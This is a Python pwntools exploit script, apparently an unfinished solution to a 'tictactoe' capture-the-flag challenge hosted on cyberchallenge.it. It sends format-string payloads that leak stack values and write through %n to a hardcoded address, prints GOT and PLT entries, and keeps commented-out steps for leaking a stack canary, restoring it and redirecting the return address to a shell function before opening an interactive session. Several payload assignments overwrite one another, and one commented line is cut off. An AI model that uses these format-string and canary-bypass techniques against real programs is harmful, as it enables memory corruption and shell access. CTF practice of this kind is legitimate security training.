#!/usr/bin/env python3

from pwn import *
from binascii import hexlify

exe = ELF("./tictactoe")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("tictactoe.challs.cyberchallenge.it", 9132)

    return r

def cycle_input(r, payload):
    print(payload)
    data = r.recvline()
    print(data)
    data = r.recvline()
    print(data)
    data = r.recvline()
    print(data)
    data = r.recvline()
    print(data)
    data = r.recvline()
    print(data)
    data = r.recvline()
    print(data)
    data=r.recvuntil("Your move: ")
    print(data)

def build_payload(start, quantity):
    payload = b'a '
    for n in range(start, start+quantity):
        payload = payload + b'%' + (str(n)).encode('utf8') + b'$x '
        print(b'n is: ' + (str(n)).encode('utf8'))
    return payload


def main():
    r = conn()
    #print(r.pid)

    # good luck pwning :)

    # canary leak
    # ret addr is at %x * 14
    # canary is at   %x * 13
  #  payload = build_payload(48, 64)
  #  addr = p32(0x
  #  payload = addr + '%n'
  #  #payload = b'a ' + b'%192$x %192$x %193$x'
  #  cycle_input(r, payload)
  #  r.sendline(payload)
  #  data = r.recvline()
  #  print(data)
  #  canary_size = 8 #  #print(b"CANARY IS: " + hexlify(canary))

  ########################################################

    payload = p32(0xFFC709FC, endianness = 'little') + b'aaa%n'
    print('GOT.PUTS')
    print(exe.got.puts)
    print('PLT')
    print(exe.plt)
    cycle_input(r, payload)

    payload = b'/bin/sh'
    payload = b'a'*2 + b'%x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x '
    payload = b'%4$x %'
    strlen_got = exe.got.strlen
    print("strlen_got = " + str(strlen_got))
    r.sendline(payload)
    data = r.recvline()
    print(data)

  ########################################################

    # override canary
   # payload = b'a'*72 + b'b'*8
   # r.send(payload)
   # data = r.recvline()
   # print(data)
   # 

   # # restore canary
   # payload = b'a'*72 + canary
   # r.send(payload)
   # data = r.recvline()
   # print(data)

   # # override return address without changing canary
   # shell_fun_addr = p64(0x00400897)
   # payload = b'a'*72 + canary + shell_fun_addr
   # r.send(payload)
   # data = r.recvline()
   # print(data)

   # # make program return
   # payload = b'\n'
   # r.send(payload)
   # data = r.recvline()
   # print(data)

    r.interactive()


if __name__ == "__main__":
    main()
